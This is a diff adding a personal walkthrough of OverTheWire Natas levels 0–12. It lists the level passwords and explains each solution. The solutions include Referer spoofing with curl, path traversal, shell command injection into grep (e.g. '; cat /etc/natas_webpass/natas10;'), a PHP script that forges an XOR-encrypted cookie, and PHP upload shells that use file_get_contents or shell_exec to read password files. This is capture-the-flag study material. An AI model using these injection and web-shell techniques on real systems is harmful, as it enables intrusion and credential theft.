@@ -1,1 +1,180 @@
+http://natasX.natas.labs.overthewire.org
+
+1:gtVrDuiDfck831PqWsLEZy5gyDz1clto
+2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi
+3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
+4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
+5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
+6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
+7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
+8:DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe  
+9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl 
+10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
+13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
+
+0: View the source code of the web page and it's there as a comment.
+
+1: Again the password is in the page source code. Rightclicking
+only seemed to be blocked in some positions. Anyway the source code
+can be found using ctrl u.
+
+2: Looking at the source code for the page it's apparent that there 
+is an image on the page. The source code shows the image file is
+stored at /files/pixel.png. Putting 
+	http://natas2.natas.labs.overthewire.org/files/
+into the browser takes you to a directory which contains pixel.png as
+expected but also contains a file users.txt. Inside the file we find
+the password for natas3 as well as some other passwords.
+
+3: Hint in source code says that there will be no more information
+leaks, even Google will not be able to find them. Google uses web
+crawlers to index pages. There is such a thing as the robots
+exclusion protocol where a robots.txt file is placed in the root of
+the website hierachy, the file tells the crawler which parts of the
+web server are off limits. Polite crawlers adhere to this. Checking,
+	http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
+tells us that web crawlers are disallowed from the directory /s3cr3t/.
+Navigating there we find that there is a users.txt file
+which gives the password.
+   
+4: The page states that we need to have travelled from natas5. In order
+to make the server believe we've travelled from natas5 we need to
+spoof the http referer (sic) url. This can be achieved with the cURL
+command from the command line. 
+
+curl -u natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ http://natas4.natas.labs.overthewire.org/ 
+--referer http://natas5.natas.labs.overthewire.org/
+
+5: The page says we're not logged in. Checking the page info from the
+Iceweasel browser you can see that a cookie has been created which has content
+0. I used the cookie editor add on for Iceweasel to change the content
+to 1, refreshing the page gives the password.
+
+6: Secret is FOEIUWGHFEEUHOFUOIU. Spent a while trying to inject php
+that would make the if statement evaluate to true. Instead notice that
+the source uses the statement,
+	include "includes/secret.inc"
+Opening the URL 
+	http://natas6.natas.labs.overthewire.org/includes/secret.inc
+takes you to a seemingly blank page. Checking the source gives a php
+script
+
+<?
+$secret = "FOEIUWGHFEEUHOFUOIU";
+?>
+
+providing the secret.
+
+7: When clicking the home or the about link we can notice that the 
+page name is given to the variable page in the URL. Following the 
+hint in the source code we know that the required password is stored
+on page /etc/natas_webpass/natas8, passing this to the variable page
+in the url takes us to the required page to retrieve the password.
+
+8: Input secret is oubWYf2kBq. Checking the source gives the encoded
+secret and the method used to encode it. We apply the inverse method
+to find the original sequence. You can google an online php executor
+then enter 
+	echo base64_decode(strrev(hex2bin("3d3d516343746d4d6d6c315669563362"))); 
+So first we turn it from hex back to binary, then apply string reverse
+before decoding it from base64. Inputing the secret we get the password.
+
+9: Looking at the source code shows that the input from the
+form is used to create the command passed to the operating system.
+The input isn't sanitised in any way. We exploit that fact to get
+the password by submitting
+ ; cat /etc/natas_webpass/natas10;
+The semicolon ends the grep command and then we execute the cat
+command on /etc/natas_webpass/natas10 to get the password the final
+semicolon prevents cat from being called on dictionary.txt also, 
+although that's not particularly important, we'd still get the password 
+first.
+
+10: Looking at the source we see that now certain special characters
+cannot be passed into the command. The php script checks whether
+the input contains any elements in the set [;|&] before passing it 
+on to the passthru function. This means we cannot use the same trick
+as before. However we still have some freedom to alter the grep command.
+In particular we can pass it something along the lines of
+key="word filename", so that grep looks for the given word in filename
+and then in dictionary.txt. To check this works try,
+	a /etc/natas_webpass/natas10
+this returns the password for natas10 before lots of words containing
+a in dictionary.txt. Note -i option in the source
+command means case distinctions are ignored. So now we know it works,
+all we need to do is guess one letter from the level 11 password correctly.
+Trying with c we get the password.
+	c /etc/natas_webpass/natas11
+
+11: From the source code we know that the xor algorithm is used to 
+encrypt an array and set the cookie. The array has password value set
+to 'no'. We need to alter our cookie, giving it the value of the
+encrypted array but with the password value set to 'yes', then the
+password will be displayed. The problem is that the xor algorithm
+uses a key, which is censored in the source code. We need to find the
+key. TODO, explain more... 
+
+Used this script:
+
+<?php
+
+function xor_encrypt($in,$key_in) {
+    $key = $key_in;
+    $text = $in;
+    $outText = '';
+
+    // Iterate through each character
+    for($i=0;$i<strlen($text);$i++) {
+    $outText .= $text[$i] ^ $key[$i % strlen($key)];
+    }
+
+    return $outText;
+}
+
+$cookie =  base64_decode('ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D');
+$input = json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff"));       
+$key = xor_encrypt($cookie,$input);
+echo $key.'</br>';
+$real_key='qw8J';
+$new_input=json_encode(array( "showpassword"=>"yes", "bgcolor"=>"#ffffff"));
+echo base64_encode(xor_encrypt($new_input,$real_key))."<br>";
+
+12: From looking at the source code we see some functions which are
+used to generate a random path from a given directory and filename.
+When the upload a file button is clicked, the uploaded file is moved
+to /upload/"some random 10 digit string"."extension of 
+$_POST["filename"]". The extension is taken from the hidden field
+"filename" which has default value "some random string".jpg.
+The next page then gives a link to the file. If we try uploading a file
+test then when we click the link we get an error telling us the image
+cannot be displayed. So the server has interpreted our file as an image
+file due to the jpg extension. Right clicking on the page and using 
+inspect element we can change the hidden field filename's value to 
+a.php. Then create a file "test" with contents, 
+
+<?php
+
+echo "hello";
+
+Uploading the file and clicking the created link we see the file was
+executed as a php file. Changing the contents of "test" to
+
+<?php
+
+$file=file_get_contents("/etc/natas_webpass/natas13");
+echo $file;
+
+Uploading the file and clicking the link gets the password.
+
+alternatively could use,
+
+<?php
+$output = shell_exec("cat /etc/natas_webpass/natas13");
+echo "<pre>$output</pre>";
+
+shell_exec allows other types of commands to be executed on the 
+servers system.
+
 
